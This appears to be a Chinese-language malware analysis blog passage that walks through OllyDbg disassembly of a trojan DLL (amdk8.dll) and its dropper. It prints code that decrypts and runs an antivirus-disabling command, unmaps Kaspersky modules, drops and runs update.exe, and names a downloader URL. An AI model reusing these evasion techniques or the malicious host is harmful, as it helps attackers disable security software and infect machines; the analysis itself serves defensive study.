1000168B  |.  68 282E0010   |push amdk8.10002E28                     ;  ASCII "avp.exh"  
10001690  |.  80C1 FD       |add cl,0FD  
10001693  |.  888E 282E0010 |mov byte ptr ds:\[esi+10002E28\],cl       这个循环就是解密字符串（dys1h{h）了，很简单，一个 add 操作  
10001699  |.  46            |inc esi  
1000169A  |.  FFD7          |call edi  
1000169C  |.  3BF0          |cmp esi,eax  
1000169E  |.^ 7C E5         \\jl short amdk8.10001685  
100016A0  |>  5F            pop edi  
100016A1  |.  B8 282E0010   mov eax,amdk8.10002E28                   ;  ASCII "avp.exh"  
100016A6  |.  5E            pop esi  
100016A7  \\.  C3            retn  
  
  
}  
1000256E  |.  83C4 04       |add esp,4  
10002571  |.  8D8D D4FEFFFF |lea ecx,\[local.75\]                       遍历系统进程看看有没有 avp.exe 进程  
10002577  |.  50            |push eax  
10002578  |.  51            |push ecx  
10002579  |.  FFD7          |call edi  
1000257B  |.  85C0          |test eax,eax  
1000257D  |.  0F85 0C010000 |jnz amdk8.1000268F                     我系统里没有安装卡巴，所以这里跳走，改标志位，不让他跳走  
10002583  |.  90            |nop  
10002584  |.  68 90100010   |push amdk8.10001090                     ;  frqilj#dys#vwduw@#glvdeohg  
10002589  |.  E8 D2F0FFFF   |call amdk8.10001660                     这个函数继续解密字符串 frqilj#dys#vwduw@#glvdeohg  
1000258E  |.  83C4 04       |add esp,4                               这个字符串解密为：config avp start= disabled，就是关闭卡巴  
10002591  |.  8D95 B0FDFFFF |lea edx,\[local.148\]  
10002597  |.  50            |push eax  
10002598  |.  52            |push edx  
10002599  |.  FFD6          |call esi  
1000259B  |.  6A 00         |push 0  
1000259D  |.  8D85 B0FDFFFF |lea eax,\[local.148\]  
100025A3  |.  6A 00         |push 0  
100025A5  |.  8D4D FC       |lea ecx,\[local.1\]  
100025A8  |.  50            |push eax  
100025A9  |.  51            |push ecx  
100025AA  |.  6A 00         |push 0  
100025AC  |.  6A 00         |push 0  
100025AE  |.  FF15 202E0010 |call dword ptr ds:\[10002E20\]            ;  shell32.ShellExecuteA 执行 config avp start= disabled  
100025B4  |.  68 F572993D   |push 3D9972F5  
100025B9  |.  6A 01         |push 1  
100025BB  |.  E8 D0030000   |call amdk8.10002990  
100025C0  |.  68 C4090000   |push 9C4  
100025C5  |.  FFD0          |call eax  
100025C7  |.  8B95 B8FEFFFF |mov edx,\[local.82\]  
100025CD  |.  68 30160010   |push amdk8.10001630                     ;  kavbase.kdl  
100025D2  |.  52            |push edx  
100025D3  |.  E8 08FDFFFF   |call amdk8.100022E0                      这个 call 又动作了，干坏事啊干坏事，进去看看  
  
{  
100022E0  /$  55            push ebp  
100022E1  |.  8BEC          mov ebp,esp  
100022E3  |.  81EC 2C030000 sub esp,32C  
100022E9  |.  53            push ebx  
100022EA  |.  56            push esi  
100022EB  |.  57            push edi  
100022EC  |.  B9 3F000000   mov ecx,3F  
100022F1  |.  33C0          xor eax,eax  
100022F3  |.  8DBD F8FEFFFF lea edi,\[local.66\]  
100022F9  |.  F3:AB         rep stos dword ptr es:\[edi\]  
100022FB  |.  8B75 08       mov esi,\[arg.1\]  
100022FE  |.  B9 88000000   mov ecx,88  
10002303  |.  66:AB         stos word ptr es:\[edi\]  
10002305  |.  AA            stos byte ptr es:\[edi\]  
10002306  |.  33C0          xor eax,eax  
10002308  |.  8DBD D8FCFFFF lea edi,\[local.202\]  
1000230E  |.  56            push esi                                 ; /ProcessId  
1000230F  |.  50            push eax                                 ; |Inheritable => FALSE  
10002310  |.  F3:AB         rep stos dword ptr es:\[edi\]              ; |  
10002312  |.  68 FF0F1F00   push 1F0FFF                              ; |Access = PROCESS\_ALL\_ACCESS  
10002317  |.  C745 FC 00000>mov \[local.1\],0                          ; |  
1000231E  |.  FF15 38100010 call dword ptr ds:\[<&KERNEL32.OpenProces>; \\OpenProcess  
10002324  |.  68 4FD1C15B   push 5BC1D14F  
10002329  |.  6A 01         push 1  
1000232B  |.  8945 F8       mov \[local.2\],eax  
1000232E  |.  E8 5D060000   call amdk8.10002990  
10002333  |.  56            push esi  
10002334  |.  6A 08         push 8  
10002336  |.  FFD0          call eax                                  创建进程快照 CreateToolhelp32Snapshot  
10002338  |.  8945 08       mov \[arg.1\],eax  
1000233B  |.  C785 D4FCFFFF>mov \[local.203\],224  
10002345  |.  60            pushad  
10002346  |.  83C2 77       add edx,77  
10002349  |.  61            popad  
1000234A  |.  68 1D52095C   push 5C09521D  
1000234F  |.  6A 01         push 1  
10002351  |.  E8 3A060000   call amdk8.10002990  
10002356  |.  8B7D 08       mov edi,\[arg.1\]  
10002359  |.  8D8D D4FCFFFF lea ecx,\[local.203\]  
1000235F  |.  51            push ecx  
10002360  |.  57            push edi  
10002361  |.  FFD0          call eax                                 Module32Next 查找下一个模块  
10002363  |.  85C0          test eax,eax  
10002365  |.  0F84 E1000000 je amdk8.1000244C  
1000236B  |.  90            nop  
1000236C  |.  8B35 04100010 mov esi,dword ptr ds:\[<&KERNEL32.lstrcpy>;  kernel32.lstrcpyA  
10002372  |.  8D95 F4FDFFFF lea edx,\[local.131\]  
10002378  |.  8D85 F8FEFFFF lea eax,\[local.66\]  
1000237E  |.  52            push edx                                 ; /String2  
1000237F  |.  50            push eax                                 ; |String1  
10002380  |.  FFD6          call esi                                 ; \\lstrcpyA  
10002382  |.  90            nop  
10002383  |.  8B1D 44100010 mov ebx,dword ptr ds:\[<&MSVCRT.strrchr>\] ;  msvcrt.strrchr  
10002389  |.  8D8D F8FEFFFF lea ecx,\[local.66\]  
1000238F  |.  6A 5C         push 5C                                  ; /c = 5C  ('\\')  
10002391  |.  51            push ecx                                 ; |s  
10002392  |.  FFD3          call ebx                                 ; \\strrchr  
10002394  |.  83C4 08       add esp,8  
10002397  |.  90            nop  
10002398  |.  40            inc eax  
10002399  |.  8D95 F8FEFFFF lea edx,\[local.66\]  
1000239F  |.  50            push eax  
100023A0  |.  52            push edx  
100023A1  |.  FFD6          call esi  
100023A3  |.  8B45 0C       mov eax,\[arg.2\]  
100023A6  |.  8D8D F8FEFFFF lea ecx,\[local.66\]  
100023AC  |.  50            push eax                                 ; /String2  
100023AD  |.  51            push ecx                                 ; |String1  
100023AE  |.  FF15 30100010 call dword ptr ds:\[<&KERNEL32.lstrcmpiA>>; \\lstrcmpiA  
100023B4  |.  85C0          test eax,eax  
100023B6  |.  74 77         je short amdk8.1000242F  
100023B8  |.  68 1D52095C   push 5C09521D  
100023BD  |.  6A 01         push 1  
100023BF  |.  E8 CC050000   call amdk8.10002990  
100023C4  |.  8D95 D4FCFFFF lea edx,\[local.203\]  
100023CA  |.  52            push edx  
100023CB  |.  57            push edi  
100023CC  |.  FFD0          call eax                                 Module32Next 继续查找，因为我系统没有卡巴，所以这里有些不准确  
100023CE  |.  85C0          test eax,eax  
100023D0  |.  74 7A         je short amdk8.1000244C  
100023D2  |>  8D85 F4FDFFFF /lea eax,\[local.131\]  
100023D8  |.  8D8D F8FEFFFF |lea ecx,\[local.66\]  
100023DE  |.  50            |push eax  
100023DF  |.  51            |push ecx  
100023E0  |.  FFD6          |call esi  
100023E2  |.  90            |nop  
100023E3  |.  8D95 F8FEFFFF |lea edx,\[local.66\]  
100023E9  |.  6A 5C         |push 5C  
100023EB  |.  52            |push edx  
100023EC  |.  FFD3          |call ebx  
100023EE  |.  83C4 08       |add esp,8  
100023F1  |.  90            |nop  
100023F2  |.  40            |inc eax  
100023F3  |.  50            |push eax  
100023F4  |.  8D85 F8FEFFFF |lea eax,\[local.66\]  
100023FA  |.  50            |push eax  
100023FB  |.  FFD6          |call esi  
100023FD  |.  90            |nop  
100023FE  |.  8B4D 0C       |mov ecx,\[arg.2\]  
10002401  |.  8D95 F8FEFFFF |lea edx,\[local.66\]  
10002407  |.  51            |push ecx                                ; /String2  
10002408  |.  52            |push edx                                ; |String1  
10002409  |.  FF15 30100010 |call dword ptr ds:\[<&KERNEL32.lstrcmpiA>; \\lstrcmpiA  
1000240F  |.  85C0          |test eax,eax  
10002411  |.  74 1C         |je short amdk8.1000242F  
10002413  |.  68 1D52095C   |push 5C09521D  
10002418  |.  6A 01         |push 1  
1000241A  |.  E8 71050000   |call amdk8.10002990  
1000241F  |.  8D8D D4FCFFFF |lea ecx,\[local.203\]  
10002425  |.  51            |push ecx  
10002426  |.  57            |push edi  
10002427  |.  FFD0          |call eax  
10002429  |.  85C0          |test eax,eax  
1000242B  |.^ 75 A5         \\jnz short amdk8.100023D2  
1000242D  |.  EB 1D         jmp short amdk8.1000244C  
1000242F  |>  8B95 E8FCFFFF mov edx,\[local.198\]  
10002435  |.  8B4D F8       mov ecx,\[local.2\]  
10002438  |.  8B85 F0FCFFFF mov eax,\[local.196\]  
1000243E  |.  52            push edx  
1000243F  |.  51            push ecx  
10002440  |.  50            push eax  
10002441  |.  8945 FC       mov \[local.1\],eax  
10002444  |.  E8 C7FDFFFF   call amdk8.10002210                         这个函数调用 ZwUnmapViewOfSection 结束 kavbase.kdl 这个文件  
10002449  |.  83C4 0C       add esp,0C  
1000244C  |>  68 D5B03E72   push 723EB0D5  
10002451  |.  6A 01         push 1  
10002453  |.  E8 38050000   call amdk8.10002990  
10002458  |.  57            push edi  
10002459  |.  FFD0          call eax  
1000245B  |.  60            pushad  
1000245C  |.  83F0 28       xor eax,28  
1000245F  |.  61            popad  
10002460  |.  8B45 FC       mov eax,\[local.1\]  
10002463  |.  5F            pop edi  
10002464  |.  5E            pop esi  
10002465  |.  5B            pop ebx  
10002466  |.  8BE5          mov esp,ebp  
10002468  |.  5D            pop ebp  
10002469  \\.  C3            retn  
  
  
}  
100025D8  |.  8B85 B8FEFFFF |mov eax,\[local.82\]  
100025DE  |.  68 24160010   |push amdk8.10001624                     ;  webav.kdl  
100025E3  |.  50            |push eax  
100025E4  |.  E8 F7FCFFFF   |call amdk8.100022E0                      同理都是卸载之  
100025E9  |.  8B8D B8FEFFFF |mov ecx,\[local.82\]   
100025EF  |.  68 18160010   |push amdk8.10001618                     ;  vlns.kdl  
100025F4  |.  51            |push ecx  
100025F5  |.  E8 E6FCFFFF   |call amdk8.100022E0  
100025FA  |.  8B95 B8FEFFFF |mov edx,\[local.82\]  
10002600  |.  68 0C160010   |push amdk8.1000160C                     ;  mark.kdl  
10002605  |.  52            |push edx  
10002606  |.  E8 D5FCFFFF   |call amdk8.100022E0  
1000260B  |.  8B85 B8FEFFFF |mov eax,\[local.82\]  
10002611  |.  68 00160010   |push amdk8.10001600                     ;  klavemu.kdl  
10002616  |.  50            |push eax  
10002617  |.  E8 C4FCFFFF   |call amdk8.100022E0  
1000261C  |.  8B8D B8FEFFFF |mov ecx,\[local.82\]  
10002622  |.  68 F4150010   |push amdk8.100015F4                     ;  kjim.kdl  
10002627  |.  51            |push ecx  
10002628  |.  E8 B3FCFFFF   |call amdk8.100022E0  
1000262D  |.  83C4 30       |add esp,30  
10002630  |.  90            |nop  
10002631  |.  68 F572993D   |push 3D9972F5  
10002636  |.  6A 01         |push 1  
10002638  |.  E8 53030000   |call amdk8.10002990  
1000263D  |.  68 E8030000   |push 3E8  
10002642  |.  FFD0          |call eax  
10002644  |.  90            |nop  
10002645  |.  8D55 EC       |lea edx,\[local.5\]  
10002648  |.  8D85 B0FDFFFF |lea eax,\[local.148\]  
1000264E  |.  52            |push edx  
1000264F  |.  50            |push eax  
10002650  |.  FFD6          |call esi  
10002652  |.  8D4D D8       |lea ecx,\[local.10\]  
10002655  |.  8D95 B0FCFFFF |lea edx,\[local.212\]  
1000265B  |.  51            |push ecx  
1000265C  |.  52            |push edx  
1000265D  |.  FFD6          |call esi  
1000265F  |.  6A 00         |push 0  
10002661  |.  8D85 B0FCFFFF |lea eax,\[local.212\]  
10002667  |.  6A 00         |push 0  
10002669  |.  8D8D B0FDFFFF |lea ecx,\[local.148\]  
1000266F  |.  50            |push eax  
10002670  |.  51            |push ecx  
10002671  |.  6A 00         |push 0  
10002673  |.  6A 00         |push 0  
10002675  |.  FF15 202E0010 |call dword ptr ds:\[10002E20\]            ;  shell32.ShellExecuteA  
1000267B  |.  68 F572993D   |push 3D9972F5  
10002680  |.  6A 01         |push 1  
10002682  |.  E8 09030000   |call amdk8.10002990  
10002687  |.  68 94110000   |push 1194  
1000268C  |.  FFD0          |call eax  
1000268E  |.  90            |nop  
1000268F  |>  8D95 B0FEFFFF |lea edx,\[local.84\]  
10002695  |.  52            |push edx                                ; /lppe  
10002696  |.  53            |push ebx                                ; |hSnapshot  
10002697  |.  E8 74050000   |call <jmp.&KERNEL32.Process32Next>      ; \\Process32Next  
1000269C  |.  85C0          |test eax,eax  
1000269E  |.^ 0F85 C0FEFFFF \\jnz amdk8.10002564  
100026A4  |>  68 D5B03E72   push 723EB0D5  
100026A9  |.  6A 01         push 1  
100026AB  |.  E8 E0020000   call amdk8.10002990  
100026B0  |.  53            push ebx  
100026B1  |.  FFD0          call eax  
100026B3  |.  60            pushad  
100026B4  |.  83F0 28       xor eax,28  
100026B7  |.  61            popad  
100026B8  |.  5F            pop edi  
100026B9  |.  5E            pop esi  
100026BA  |.  33C0          xor eax,eax  
100026BC  |.  5B            pop ebx  
100026BD  |.  8BE5          mov esp,ebp  
100026BF  |.  5D            pop ebp  
100026C0  \\.  C3            retn  
}  
  
总结一下上面的代码做的坏事，首先遍历进程查找 avp.exe，如果找到调用 config avp start= disabled 结束，并结束卡巴的系列文件  
  
如：  
  
    kavbase.kdl  
    webav.kdl  
    vlns.kdl  
    mark.kdl  
    klavemu.kdl  
    kjim.kdl  
  
  
  
1000288E  |.  60            pushad  
1000288F  |.  90            nop  
10002890  |.  33C2          xor eax,edx  
10002892  |.  90            nop  
10002893  |.  61            popad  
10002894  |.  90            nop  
10002895  |.  68 F572993D   push 3D9972F5  
1000289A  |.  6A 01         push 1  
1000289C  |.  E8 EF000000   call amdk8.10002990  
100028A1  |.  68 E8030000   push 3E8  
100028A6  |.  FFD0          call eax  
100028A8  |.  60            pushad  
100028A9  |.  90            nop  
100028AA  |.  33C2          xor eax,edx  
100028AC  |.  90            nop  
100028AD  |.  61            popad  
100028AE  |.  8B75 08       mov esi,\[arg.1\]  
100028B1  |.  56            push esi  
100028B2  |.  E8 09F6FFFF   call amdk8.10001EC0                      ;  干杀软  
  
为了节省空间我就不详细分析了，通过创建进程快照，查找主流杀软的进程，如果存在的话，就干掉，呼呼~~~  
  
100028B7  |.  85C8          test eax,ecx  
100028B9  |.  90            nop  
100028BA  |.  90            nop  
100028BB  |.  53            push ebx  
100028BC  |.  90            nop  
100028BD  |.  90            nop  
100028BE  |.  74 0A         je short amdk8.100028CA  
100028C0  |.  C1E1 01       shl ecx,1  
100028C3  |.  8BD9          mov ebx,ecx  
100028C5  |.  C1EB 01       shr ebx,1  
100028C8  |.  87D9          xchg ecx,ebx  
100028CA  |>  5B            pop ebx  
100028CB  |.  90            nop  
100028CC  |.  56            push esi  
100028CD  |.  E8 AEF4FFFF   call amdk8.10001D80  
100028D2  |.  83C4 04       add esp,4  
100028D5  |.  90            nop  
100028D6  |.  68 F572993D   push 3D9972F5  
100028DB  |.  6A 01         push 1  
100028DD  |.  E8 AE000000   call amdk8.10002990  
100028E2  |.  68 E8030000   push 3E8  
100028E7  |.  FFD0          call eax  
100028E9  |.  6A 00         push 0  
100028EB  |.  8D45 D0       lea eax,\[local.12\]  
100028EE  |.  6A 00         push 0  
100028F0  |.  50            push eax  
100028F1  |.  68 58160010   push amdk8.10001658                      ;  sc  
100028F6  |.  68 50160010   push amdk8.10001650                      ;  open  
100028FB  |.  6A 00         push 0  
100028FD  |.  FF15 202E0010 call dword ptr ds:\[10002E20\]  
10002903  |.  68 F572993D   push 3D9972F5  
10002908  |.  6A 01         push 1  
1000290A  |.  E8 81000000   call amdk8.10002990  
1000290F  |.  68 D0070000   push 7D0  
10002914  |.  FFD0          call eax  
10002916  |.  5F            pop edi  
10002917  |.  5E            pop esi  
10002918  |.  5B            pop ebx  
10002919  |.  8BE5          mov esp,ebp  
1000291B  |.  5D            pop ebp  
1000291C  \\.  C3            retn  
  
  
  
  
  
amdk8.dll 分析完了，再回到主程序，继续向下分析：  
  
0041E8E6    90              nop  
0041E8E7    90              nop  
0041E8E8    03D3            add edx,ebx  
0041E8EA    90              nop  
0041E8EB    90              nop  
0041E8EC    03D3            add edx,ebx  
0041E8EE    90              nop  
0041E8EF    F7D3            not ebx  
0041E8F1    90              nop  
0041E8F2    90              nop  
0041E8F3    90              nop  
0041E8F4    43              inc ebx  
0041E8F5    90              nop  
0041E8F6    90              nop  
0041E8F7    03D3            add edx,ebx  
0041E8F9    90              nop  
0041E8FA    90              nop  
0041E8FB    F7DB            neg ebx  
0041E8FD    90              nop  
0041E8FE    90              nop  
0041E8FF    8D85 70FDFFFF   lea eax,dword ptr ss:\[ebp-290\]                   C:\\progra~1\\ATI\\amdk8.inf 里面是安装信息  
0041E905    68 9CCE4100     push x1un\_.0041CE9C                              ; ASCII "\*amdk8Device"  
0041E90A    50              push eax  
0041E90B    E8 90EDFFFF     call x1un\_.0041D6A0                             加载 setupapi.dll，开始加载驱动进行一系列的破坏  
  
这里加载了 N 多与驱动有关的函数，没搞过驱动，表示鸭梨有点大~~  
  
0041E910    68 E8030000     push 3E8  
0041E915    E8 26F5FFFF     call x1un\_.0041DE40  
0041E91A    6A 00           push 0  
0041E91C    68 D8CD4100     push x1un\_.0041CDD8  
0041E921    E8 2AF1FFFF     call x1un\_.0041DA50  
0041E926    8BF0            mov esi,eax  
0041E928    83C4 14         add esp,14  
0041E92B    85F6            test esi,esi  
0041E92D    75 27           jnz short x1un\_.0041E956  
0041E92F    8D8D 70FDFFFF   lea ecx,dword ptr ss:\[ebp-290\]  
0041E935    51              push ecx  
0041E936    E8 45F4FFFF     call x1un\_.0041DD80                             删除 amdk8.inf  
0041E93B    8D95 70FCFFFF   lea edx,dword ptr ss:\[ebp-390\]  
0041E941    52              push edx  
0041E942    E8 39F4FFFF     call x1un\_.0041DD80                             删除 amdk.sys  
0041E947    83C4 08         add esp,8  
0041E94A    B8 01000000     mov eax,1  
0041E94F    5F              pop edi  
0041E950    5E              pop esi  
0041E951    5B              pop ebx  
0041E952    8BE5            mov esp,ebp  
0041E954    5D              pop ebp  
0041E955    C3              retn  
  
}  
  
  
继续向下走：  
  
0041EC93    60                    pushad  
0041EC94    81E9 99000000         sub ecx,99  
0041EC9A    90                    nop  
0041EC9B    35 99000000           xor eax,99  
0041ECA0    90                    nop  
0041ECA1    2D 99000000           sub eax,99  
0041ECA6    61                    popad  
0041ECA7    B0 61                 mov al,61  
0041ECA9    B9 3F000000           mov ecx,3F  
0041ECAE    8845 EB               mov byte ptr ss:\[ebp-15\],al  
0041ECB1    8845 ED               mov byte ptr ss:\[ebp-13\],al  
0041ECB4    B0 65                 mov al,65  
0041ECB6    8DBD E8FEFFFF         lea edi,dword ptr ss:\[ebp-118\]  
0041ECBC    8845 EF               mov byte ptr ss:\[ebp-11\],al  
0041ECBF    8845 F1               mov byte ptr ss:\[ebp-F\],al  
0041ECC2    33C0                  xor eax,eax  
0041ECC4    C645 E8 75            mov byte ptr ss:\[ebp-18\],75  
0041ECC8    F3:AB                 rep stos dword ptr es:\[edi\]  
0041ECCA    66:AB                 stos word ptr es:\[edi\]  
0041ECCC    C645 E9 70            mov byte ptr ss:\[ebp-17\],70  
0041ECD0    C645 EA 64            mov byte ptr ss:\[ebp-16\],64  
0041ECD4    C645 EC 74            mov byte ptr ss:\[ebp-14\],74  
0041ECD8    C645 EE 2E            mov byte ptr ss:\[ebp-12\],2E  
0041ECDC    C645 F0 78            mov byte ptr ss:\[ebp-10\],78  
0041ECE0    C645 F2 00            mov byte ptr ss:\[ebp-E\],0  
0041ECE4    AA                    stos byte ptr es:\[edi\]  
0041ECE5    90                    nop  
0041ECE6    8D85 E8FEFFFF         lea eax,dword ptr ss:\[ebp-118\]  
0041ECEC    50                    push eax  
0041ECED    68 FF000000           push 0FF  
0041ECF2    E8 D9EEFFFF           call x1un\_.0041DBD0                    通过加载 kernel32.dll 实现函数 GetTempPath，获取临时目录  
  
在临时目录 C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\下生成 update.exe  
  
0041ED14    8D4D E8               lea ecx,dword ptr ss:\[ebp-18\]                  ; updata.exe  
0041ED17    8D95 E8FEFFFF         lea edx,dword ptr ss:\[ebp-118\]                 ; C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\  
0041ED1D    51                    push ecx  
0041ED1E    52                    push edx  
0041ED1F    FF15 48104000         call dword ptr ds:\[<&KERNEL32.lstrcat>\]        ; kernel32.lstrcatA  
0041ED25    FF15 C4104000         call dword ptr ds:\[<&USER32.GetActiveWindow>\]  ; user32.GetActiveWindow  
0041ED2B    6A 00                 push 0  
0041ED2D    50                    push eax  
0041ED2E    FF15 BC104000         call dword ptr ds:\[<&USER32.FlashWindow>\]      ; user32.FlashWindow  
0041ED34    90                    nop  
0041ED35    8D85 E8FEFFFF         lea eax,dword ptr ss:\[ebp-118\]  
0041ED3B    50                    push eax  
0041ED3C    E8 DFE5FFFF           call x1un\_.0041D320                            创建 update.exe 并向其中写入数据，前面分析过，这里不展开  
0041ED41    83C4 04               add esp,4  
0041ED44    84C0                  test al,al  
0041ED46    0F84 89020000         je x1un\_.0041EFD5  
  
  
  
0041ED51    8D8D E8FEFFFF         lea ecx,dword ptr ss:\[ebp-118\]  
0041ED57    68 08114000           push x1un\_.00401108  
0041ED5C    51                    push ecx  
0041ED5D    68 E8CD4100           push x1un\_.0041CDE8                            ; ASCII "open"  
0041ED62    6A 00                 push 0  
0041ED64    E8 77F1FFFF           call x1un\_.0041DEE0                           通过加载 shell32.dll 运行 update.exe  
0041ED69    68 E8030000           push 3E8  
0041ED6E    E8 CDF0FFFF           call x1un\_.0041DE40  
  
  
然后再后去系统目录，在其中生成 ccte1sto.dat   C:\\WINDOWS\\system32\\ccte1sto.dat  
0041ED97    35 99000000           xor eax,99  
0041ED9C    90                    nop  
0041ED9D    2D 99000000           sub eax,99  
0041EDA2    61                    popad  
0041EDA3    B9 3F000000           mov ecx,3F  
0041EDA8    33C0                  xor eax,eax  
0041EDAA    8DBD E8FCFFFF         lea edi,dword ptr ss:\[ebp-318\]  
0041EDB0    8D95 E8FCFFFF         lea edx,dword ptr ss:\[ebp-318\]  
0041EDB6    F3:AB                 rep stos dword ptr es:\[edi\]  
0041EDB8    66:AB                 stos word ptr es:\[edi\]  
0041EDBA    68 FF000000           push 0FF  
0041EDBF    52                    push edx  
0041EDC0    C645 FC 6B            mov byte ptr ss:\[ebp-4\],6B  
0041EDC4    C645 FD 68            mov byte ptr ss:\[ebp-3\],68  
0041EDC8    C645 FE 79            mov byte ptr ss:\[ebp-2\],79  
0041EDCC    C645 FF 00            mov byte ptr ss:\[ebp-1\],0  
0041EDD0    AA                    stos byte ptr es:\[edi\]  
0041EDD1    FF15 50104000         call dword ptr ds:\[<&KERNEL32.GetSystemDirecto>; kernel32.GetSystemDirectoryA  
0041EDD7    8D85 E8FCFFFF         lea eax,dword ptr ss:\[ebp-318\]  
0041EDDD    68 C4CE4100           push x1un\_.0041CEC4                            ; ASCII "\\ccte1sto.dat"  
0041EDE2    50                    push eax  
0041EDE3    FF15 48104000         call dword ptr ds:\[<&KERNEL32.lstrcat>\]        ; kernel32.lstrcatA  
  
  
0041EE02    8D8D E8FCFFFF         lea ecx,dword ptr ss:\[ebp-318\]  
0041EE08    51                    push ecx  
0041EE09    E8 62E3FFFF           call x1un\_.0041D170                             创建 ccte1sto.dat 并写入数据  
0041EE0E    83C4 04               add esp,4  
  
程序结束前还会在系统目录下生成一个 kav.exe，不过最后又通过 movefile 删除掉了，这里不做分析  
  
7C817074    FF55 08               call dword ptr ss:\[ebp+8\]  
7C817077    50                    push eax  
7C817078    E8 7B50FFFF           call kernel32.ExitThread                       结束线程，程序结束  
  
  
这样，主程序基本完成了，在程序干掉杀软的地方肯定会有遗漏，比如不该跳的因为没有杀软而跳走了，望大家能够指出，促进小子进步！！  
  
  
另外程序还生成了一个 update.exe 文件，我们加载之，看看其做了哪些活动，肯定没做什么好事哈：  
  
  
这里就简略的分析下吧，做了 3 个小时了，太累了~~，呼呼~~~  
  
  
OD 载入 update.exe 程序  
  
  
载入后查找字符串发现有网址出现，可以猜测，此为一个下载者程序，试图从网址 http://you.45we.com:323/tj/count.asp，下载文件，在这里我并没仔细分析。  
等有时间了，在仔细分析下~~~ 呼呼~~~  
  
小子我偷懒了哈  
  
之前迷上了 DOTA，血雨腥风啊，打算写个 DOTA 改键，至今没有成果，无疾而终了，哎，继续加油了  
  
总结一下:世上没有免费的午餐，只有通过自己的努力，才能实现自己的理想，寝室的兄弟们都选择了考研了，我没有打算，准备去找工作，决定到底正确与否，我都会  
坚持下去，既然选择了远方，便只顾风雨兼程！！